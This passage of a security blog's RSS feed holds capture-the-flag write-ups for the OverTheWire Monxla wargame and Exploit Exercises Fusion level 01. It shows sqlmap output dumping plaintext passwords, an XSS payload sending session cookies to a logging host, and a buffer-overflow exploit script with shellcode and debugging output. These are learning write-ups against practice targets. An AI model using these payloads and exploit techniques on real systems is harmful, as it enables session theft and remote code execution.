+[17:36:40] [INFO] analyzing table dump for possible password hashes
+Database: notes
+Table: notes
+[3 entries]
++----+-------------------------------------------------------------------------------------------------+----------+
+| id | note                                                                                            | username |
++----+-------------------------------------------------------------------------------------------------+----------+
+| 1  | hello world                                                                                     | boris    |
+| 2  | Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili | boris    |
+| 3  | Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris        | vasili   |
++----+-------------------------------------------------------------------------------------------------+----------+
+
+[17:36:40] [INFO] table &#39;notes.notes&#39; dumped to CSV file &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/notes.csv&#39;
+[17:36:40] [INFO] fetching columns for table &#39;users&#39; in database &#39;notes&#39;
+[17:36:40] [INFO] the SQL query used returns 3 entries
+[17:36:40] [INFO] resumed: username
+[17:36:40] [INFO] resumed: varchar(64)
+[17:36:40] [INFO] resumed: gecos
+[17:36:40] [INFO] resumed: varchar(64)
+[17:36:40] [INFO] resumed: password
+[17:36:40] [INFO] resumed: varchar(64)
+[17:36:40] [INFO] fetching entries for table &#39;users&#39; in database &#39;notes&#39;
+[17:36:40] [INFO] the SQL query used returns 3 entries
+[17:36:40] [INFO] resumed: Boris Nasenko
+[17:36:40] [INFO] resumed: 347vEnaNufw
+[17:36:40] [INFO] resumed: boris
+[17:36:40] [INFO] resumed: Nikolai Grigorev
+[17:36:40] [INFO] resumed: !plXIlJ42VEr_notyetset
+[17:36:40] [INFO] resumed: nikolai
+[17:36:40] [INFO] resumed: Vasili Nasenko
+[17:36:40] [INFO] resumed: !bPXMZP6puxd_notyetset
+[17:36:40] [INFO] resumed: vasili
+[17:36:40] [INFO] analyzing table dump for possible password hashes
+Database: notes
+Table: users
+[3 entries]
++------------------+----------+------------------------+
+| gecos            | username | password               |
++------------------+----------+------------------------+
+| Boris Nasenko    | boris    | 347vEnaNufw            |
+| Nikolai Grigorev | nikolai  | !plXIlJ42VEr_notyetset |
+| Vasili Nasenko   | vasili   | !bPXMZP6puxd_notyetset |
++------------------+----------+------------------------+
+
+[17:36:40] [INFO] table &#39;notes.users&#39; dumped to CSV file &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/users.csv&#39;
+[17:36:40] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;
+
+[*] shutting down at 17:36:40
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Based on the post on the front page of the Nasenko page, where it states that the SSH passwords are stored in the database, I attempted to use the passwords disclosed to login.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;bash-3.2$ ssh boris@nasenko.otw
+boris@nasenko.otw&#39;s password: 
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-26-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Nov 18 06:29:24 2012 from 192.168.188.1
+boris@monxla:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And that&amp;rsquo;s all it takes to get local access to the server.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Monxla Part 2</title>
+      <link>https://www.mattandreko.com/blog/2012-11-25-overthewire-monxla-part-2/</link>
+      <pubDate>Sun, 25 Nov 2012 05:05:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-25-overthewire-monxla-part-2/</guid>
+      <description>&lt;p&gt;In the previous post, I showed how to get the PDF that outlines the services running on the Monxla VM image. This article will continue where that one left off.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;Firstly, the PDF explains that there are 2 virtual hosts enabled on the machine. To configure my machine for these virtual hosts, I added these lines to my /etc/hosts file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;192.168.188.134 nasenko.otw
+192.168.188.134 honeylink.otw
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are 2 sites immediately available to you:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The HoneyLink site is, so far, just a convenience for the wargame, so you don&amp;rsquo;t have to setup your own HTTP server.  It gives you a prefix URL, that you can prepend anything you want to the end.  It will then show you the responses as they come in. 
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;The Nasenko home page. This is what appears to be the main application that we are attacking. It has a Bookmark Service, and the Notes service, which were referenced in the PDF, immediately visible. 
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After poking around a bit, I found that you are unable to access the Notes service, since you&amp;rsquo;re not logged in. Per the blog article on the main page, login attempts are disabled. On the Bookmarks page, it says that the submitted bookmarks are being visited routinely. These two statements combined immediately made me think of using a &lt;a href=&#34;https://en.wikipedia.org/wiki/Session_hijacking&#34;&gt;Session Hijacking&lt;/a&gt; attack to steal the session of the user already logged in, checking the submitted bookmarks.&lt;/p&gt;
+
+&lt;p&gt;To get started with my attack, I tried submitting several bookmarks, which were always rejected.  There was some sort of filtering going on, on the server side.  For some reason, I decided to try submitting the Nasenko site itself, and saw that it was actually accepted.  This means that I could at least submit data, as long as it was from the same website.  From there, that made me start thinking about finding a &lt;a href=&#34;https://en.wikipedia.org/wiki/Cross-site_scripting&#34;&gt;Cross-Site Scripting&lt;/a&gt; vulnerability, so that I could redirect the traffic, and combine it with the Session Hijack attack.&lt;/p&gt;
+
+&lt;p&gt;After searching for a bit, I found a Cross-Site Scripting vulnerability in the User Info page.  It wasn&amp;rsquo;t cleanly filtering user input, so I was able to inject javascript into the &amp;ldquo;username&amp;rdquo; parameter.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;To combine these two attacks, I crafted a URL that would use the Cross-Site Scripting attack to allow me to submit it from the proper host, as well as stealing the user&amp;rsquo;s cookie:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://nasenko.otw/userinfo.php?username=&amp;lt;script&amp;gt;document.location=&#39;http://honeylink.otw/tH3zwj4P1z/cookie&#39;+document.cookie;&amp;lt;/script&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, due to some URL encoding issues (mainly the &amp;ldquo;+&amp;rdquo; splitting the parameter), I had to URL encode it using the &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://nasenko.otw/userinfo.php?username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%68%6f%6e%65%79%6c%69%6e%6b%2e%6f%74%77%2f%74%48%33%7a%77%6a%34%50%31%7a%2f%63%6f%6f%6b%69%65%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I submitted the URL to the Bookmark Service, and it gladly accepted it.  I then switched to the HoneyLink page, and clicked the &amp;ldquo;Refresh&amp;rdquo; button, and saw that my click had indeed been registered.  And lucky for me, it had the cookie listed:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then added a cookie with the stolen value.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_5.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;When I then went to the Notes Service, which previously denied me access, I was able to view them. This meant it was successful. We successfully stole a valid user&amp;rsquo;s session.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_6.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Monxla Part 1</title>
+      <link>https://www.mattandreko.com/blog/2012-11-24-overthewire-monxla-part-1/</link>
+      <pubDate>Sat, 24 Nov 2012 15:54:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-24-overthewire-monxla-part-1/</guid>
+      <description>&lt;p&gt;I had a twitter &lt;a href=&#34;https://twitter.com/Mito125twit&#34;&gt;follower&lt;/a&gt; recently inform me that OverTheWire had a new wargame up and running. &amp;nbsp;I was immediately excited and downloaded it. &amp;nbsp;Several days later, I actually was able to start tinkering with it.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;I booted up the image, and proceeded to do some preliminary nmap scans. &amp;nbsp;I found a few services runinng:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ nmap -sV -p1-65535 -T4&amp;amp;nbsp;192.168.188.134
+Starting Nmap 6.01 ( http://nmap.org ) at 2012-11-15 10:28 EST
+Nmap scan report for 192.168.188.134
+Host is up (0.0077s latency).
+Not shown: 65511 closed ports
+PORT&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; STATE SERVICE VERSION
+22/tcp&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; open&amp;amp;nbsp; ssh&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; OpenSSH 5.8p1 Debian 7ubuntu1 (protocol 2.0)
+80/tcp&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; open&amp;amp;nbsp; http&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Apache httpd 2.2.20 ((Ubuntu))
+6667/tcp&amp;amp;nbsp; open&amp;amp;nbsp; irc&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Unreal ircd
+8000/tcp&amp;amp;nbsp; open&amp;amp;nbsp; http&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Icecast streaming media server
+21342/tcp open&amp;amp;nbsp; unknown
+21768/tcp open&amp;amp;nbsp; unknown
+21951/tcp open&amp;amp;nbsp; unknown
+23917/tcp open&amp;amp;nbsp; unknown
+24578/tcp open&amp;amp;nbsp; unknown
+24783/tcp open&amp;amp;nbsp; unknown
+25275/tcp open&amp;amp;nbsp; unknown
+26791/tcp open&amp;amp;nbsp; unknown
+31308/tcp open&amp;amp;nbsp; unknown
+31418/tcp open&amp;amp;nbsp; unknown
+31874/tcp open&amp;amp;nbsp; unknown
+32704/tcp open&amp;amp;nbsp; unknown
+33039/tcp open&amp;amp;nbsp; unknown
+34466/tcp open&amp;amp;nbsp; unknown
+34538/tcp open&amp;amp;nbsp; unknown
+34957/tcp open&amp;amp;nbsp; unknown
+36199/tcp open&amp;amp;nbsp; unknown
+37213/tcp open&amp;amp;nbsp; unknown
+37628/tcp open&amp;amp;nbsp; unknown
+37956/tcp open&amp;amp;nbsp; unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Based on the clue on the &lt;a href=&#34;http://www.overthewire.org/wargames/monxla&#34;&gt;Monxla page&lt;/a&gt;, &amp;ldquo;Hint: how big is the page you are looking at?&amp;ldquo;, I connected to the webserver.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/monxla1_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;It looked like a fairly generic page, but I viewed the source, and found a huge amount of text commented out. &amp;nbsp;Since it was all alpha-numeric other than ending with a single &amp;ldquo;=&amp;rdquo;, I figured it was probably &lt;a href=&#34;https://en.wikipedia.org/wiki/Base64&#34;&gt;Base64&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I copied the text into a new file on my machine. I then decoded it and found out what type of file it was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ base64 -D monxla -o monxla.decoded
+mandreko$ file monxla.decoded
+monxla.decoded: PDF document, version 1.4
+mandreko$ mv monxla.decoded monxla.pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When the PDF (available &lt;a href=&#34;https://docs.google.com/open?id=0B6AIn0P1_ECKbzJaMEQ0VXhsZU0&#34;&gt;here&lt;/a&gt;) is then opened, it shows a report of running services that may need attacked.  This is similar to &amp;ldquo;levels&amp;rdquo; in most wargames, I believe (I haven&amp;rsquo;t yet finished this wargame).&lt;/p&gt;
+
+&lt;p&gt;My next article in this series will show how to exploit the &amp;ldquo;Bookmarks Service&amp;rdquo;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Fusion 01</title>
+      <link>https://www.mattandreko.com/blog/2012-07-03-exploit-exercises-fusion-01/</link>
+      <pubDate>Tue, 03 Jul 2012 17:19:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-07-03-exploit-exercises-fusion-01/</guid>
+      <description>&lt;p&gt;It&amp;rsquo;s been a while since I last did a write-up about &lt;a href=&#34;http://www.exploit-exercises.com&#34;&gt;Exploit Exercises&lt;/a&gt;. I&amp;rsquo;m starting to look back at it now, since I have some more free time again. I&amp;rsquo;ve now, as I&amp;rsquo;m sure you can guess by the title of this post, solved level 01.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;So &lt;a href=&#34;http://exploit-exercises.com/fusion/level01&#34;&gt;this level&lt;/a&gt; is very similar to the first, except that it has ASLR and doesn&amp;rsquo;t tell us where the buffer is on every execution. Even if it did tell us, due to the ASLR, it very well may change every time it&amp;rsquo;s executed.  Based on this information, I went down the road of using a ret2reg method.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s start with the code we used on level 00, but change the comments and port numbers to be more appropriate:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;amp;lt;I&amp;quot;, 0xbffff999)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        print s.recv(1024)
+        s.send(&amp;quot;GET /&amp;quot; + junk + ret + &amp;quot; HTTP/1.1\n&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to start out, let&amp;rsquo;s generate some new shellcode, to touch a file in /tmp:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfpayload linux/x86/exec CMD=&amp;quot;touch /tmp/level01&amp;quot; C
+/*
+* linux/x86/exec - 54 bytes
+* http://www.metasploit.com
+* VERBOSE=false, PrependSetresuid=false,
+* PrependSetreuid=false, PrependSetuid=false,
+* PrependChrootBreak=false, AppendExit=false, CMD=touch
+* /tmp/level01
+*/
+unsigned char buf[] =
+&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to debug, let&amp;rsquo;s change the return address to 0xDEADBEEF to generate an error, since we no longer know where the buffer will be.  I also removed the &amp;ldquo;/&amp;rdquo; after the &amp;ldquo;GET&amp;rdquo;, as well as the &amp;ldquo;\n&amp;rdquo; after the &amp;ldquo;HTTP/1.1&amp;rdquo; since they&amp;rsquo;re really just junk getting in the way.  Additionally, since the buffer isn&amp;rsquo;t being printed to the screen, the &amp;ldquo;recv(1024)&amp;rdquo; code needed to be removed so the program didn&amp;rsquo;t wait for it.&lt;/p&gt;
+
+&lt;p&gt;Now, our codebase looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;amp;lt;I&amp;quot;, 0xDEADBEEF)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As expected, when it was ran, it crashed, and dumped a core.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls /tmp
+core-level01-11-20001-20001-2222-1341317061
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I loaded it into gdb to look at the dump.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ sudo gdb -q --core=/tmp/core-level01-11-20001-20001-2222-1341317061
+[New LWP 2222]
+Core was generated by `/opt/fusion/bin/level01&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0xdeadbeef in ?? ()
+(gdb) i r
+eax            0x1      1
+ecx            0xb772d8d0       -1217210160
+edx            0xbfa65d90       -1079616112
+ebx            0xb78a5ff4       -1215668236
+esp            0xbfa65d90       0xbfa65d90
+ebp            0x41414141       0x41414141
+esi            0xbfa65e44       -1079615932
+edi            0x8049ed1        134520529
+eip            0xdeadbeef       0xdeadbeef
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Initially, this shows that our return address did get hit successfully, since &amp;ldquo;0xdeadbeef&amp;rdquo; is the overwritten EIP. I then started exploring each of the registers to see if there was anything of interest.  I found that my shellcode was actually being stored in the esi register, or at least the start of the nop-sled was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) x/10x $esi
+0xbfa65e44:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfa65e54:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfa65e64:     0x90909090      0x90909090
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I immediately thought this was going to be the end of the challenge, since I could just &amp;lsquo;jmp esi&amp;rsquo;.  However, when looking for that opcode, I couldn&amp;rsquo;t find it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfelfscan -j esi /opt/fusion/bin/level01
+[/opt/fusion/bin/level01]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Trying to find another way, I looked at the stack pointer, with a little extra surrounding it to see what&amp;rsquo;s on each side:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb)  x/16x $esp-16
+0xbfa65d80:     0x41414141      0x41414141      0x41414141      0xdeadbeef
+0xbfa65d90:     0xbfa65d00      0x00000020      0x00000004      0x00000000
+0xbfa65da0:     0x001761e4      0xbfa65e30      0x20544547      0x41414141
+0xbfa65db0:     0x41414141      0x41414141      0x41414141      0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So if our stack pointer is at 0xbfa65d90, the byte right after our return (0xdeadbeef), then we could return to the esp, and then redirect to the esi!  Let&amp;rsquo;s test this by changing the return address to a &amp;lsquo;jmp esp&amp;rsquo;, and making the next byte a debug opcode to halt the program.&lt;/p&gt;
+
+&lt;p&gt;Luckily this time we have a valid address for our register:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfelfscan -j esp /opt/fusion/bin/level01
+[/opt/fusion/bin/level01]
+0x08049f4f jmp esp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now our code looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x08049f4f)
+        esi = &amp;quot;\xCC&amp;quot;
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + esi + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once it&amp;rsquo;s executed, I load it into gdb again to poke around.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls /tmp
+core-level01-5-20001-20001-2353-1341318366
+fusion@fusion:~$ sudo gdb -q --core=/tmp/core-level01-5-20001-20001-2353-1341318366
+[New LWP 2353]
+Core was generated by `/opt/fusion/bin/level01&#39;.
+Program terminated with signal 5, Trace/breakpoint trap.
+#0  0xbfa65d91 in ?? ()
+(gdb) x/16x $esp-16
+0xbfa65d80:     0x41414141      0x41414141      0x41414141      0x08049f4f
+0xbfa65d90:     0xbfa600cc      0x00000020      0x00000004      0x00000000
+0xbfa65da0:     0x001761e4      0xbfa65e30      0x20544547      0x41414141
+0xbfa65db0:     0x41414141      0x41414141      0x41414141      0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well it looks like it hit our debug point.  Let&amp;rsquo;s try replacing the &amp;ldquo;\xCC&amp;rdquo; with the opcodes for &amp;ldquo;jmp esi&amp;rdquo;.  But first we have to find what that opcode actually is.  I found a decent enough method for now on &lt;a href=&#34;http://stackoverflow.com/questions/3206535/dos-debug-like-program-for-32-bit-x86-assembly&#34;&gt;stackoverflow&lt;/a&gt;, which I modified a little for my needs. I&amp;rsquo;d like to find something better for the future though.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ echo -e &amp;quot;BITS 32\njmp esi&amp;quot; &amp;gt; tmp.S &amp;amp;&amp;amp; nasm tmp.S -o tmp.o &amp;amp;&amp;amp; ndisasm -b 32 tmp.o &amp;amp;&amp;amp; rm -f tmp.o tmp.S
+00000000  FFE6              jmp esi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since this is a 2 byte instruction, we will need to pad the end of it to 4 bytes, to align it properly.  I simply used &amp;ldquo;\x90&amp;rdquo; nops to do so, giving us the value &amp;ldquo;0x9090E6FF&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;That leaves us with the final code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x08049f4f)
+        esi = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x9090E6FF)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + esi + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
